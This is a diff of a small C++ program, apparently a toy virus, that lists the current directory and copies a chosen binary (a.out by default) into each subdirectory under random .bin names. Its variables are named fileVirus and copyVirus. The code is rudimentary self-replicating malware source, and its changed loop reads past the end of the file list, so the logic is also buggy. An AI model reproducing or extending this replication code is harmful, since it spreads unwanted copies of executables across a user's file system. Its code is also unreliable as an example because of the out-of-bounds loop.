@@ -21,7 +21,7 @@ int main()
   vector<string> files;
   ListDir("./", files);
   writeFiles(files);
-  system("echo hello");
+
   return 0;
 }
 
@@ -44,20 +44,24 @@ void ListDir(const string &path, vector<string> &files)
 // write the file
 void writeFiles(vector<string> files)
 {
-  string directory = "";
-  for (int i = 0; i < files.size(); i++)
+
+  string file = "a.out";
+  for (int i = 0; i <= files.size(); i++)
   {
     try
     {
       if (regex_match(files[i], correctFile))
+        file = files[i];
+
+      // get the directories
+      if ((!regex_match(files[i], itsAFile) == 0 || files[i] == ".") && files[i] != "..")
       {
-        ifstream fileVirus(files[i], ios::binary);
-        ofstream copyVirus((directory + "/a" + to_string(rand()) + ".bin"), ios::binary, io);
+
+        ifstream fileVirus(file, ios::binary);
+        ofstream copyVirus((files[i] + "/a" + to_string(rand()) + ".bin"), ios::binary);
+        cout << files[i] + "/a" + to_string(rand()) + ".bin" << endl;
         copyVirus << fileVirus.rdbuf();
       }
-      // get the directories
-      if (!regex_match(files[i], itsAFile) == 0 && files[i] != "..")
-        directory = files[i];
     }
     catch (...)
     {
